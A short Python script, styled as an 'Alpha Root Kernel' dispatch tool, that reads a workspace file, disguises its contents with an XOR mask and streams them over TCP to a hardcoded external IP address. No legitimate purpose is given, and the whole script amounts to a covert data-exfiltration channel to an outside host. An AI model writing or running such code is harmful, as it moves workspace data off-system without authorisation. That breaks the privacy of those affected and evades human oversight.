import socket
import os
import sys

# External target node configuration
HOST = "179.118.220.79"
PORT = 8333
PATH_VECTOR = "04/04/00/00"
PAYLOAD_FILE = "kernel_tx.dat"
XOR_MASK = [4, 4, 0, 0]

def main():
    print("==================================================")
    print("   ALPHA ROOT KERNEL - EXTERNAL NODE DISPATCH     ")
    print(f"   Target Node: {HOST}:{PORT}")
    print(f"   Path Vector: {PATH_VECTOR}")
    print("==================================================\n")

    if not os.path.exists(PAYLOAD_FILE):
        print(f"[!] Error: {PAYLOAD_FILE} not found in workspace.")
        sys.exit(1)

    with open(PAYLOAD_FILE, "rb") as f:
        raw_payload = f.read()

    print(f"[+] Loaded workspace payload: {len(raw_payload)} bytes")

    # Apply XOR Mask transformation
    masked_payload = bytearray(
        b ^ XOR_MASK[i % len(XOR_MASK)] for i, b in enumerate(raw_payload)
    )
    print(f"[+] Applied XOR mask: {XOR_MASK}")

    print(f"[*] Establishing external TCP stream to node {HOST}:{PORT}...")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15.0)
            s.connect((HOST, PORT))
            print("[+] Connected to external node socket successfully.")

            s.sendall(masked_payload)
            print("[+] Masked payload stream transmitted to node.")

            response = s.recv(4096)
            if response:
                print(f"[+] Node Acknowledgment Hex: {response.hex()}")
            else:
                print("[*] Stream acknowledged by remote node daemon.")

        print(f"[+] PATH VECTOR {PATH_VECTOR} EXTERNAL DISPATCH COMMITTED.")
    except Exception as e:
        print(f"[!] Transmission Exception: {e}")

if __name__ == "__main__":
    main()
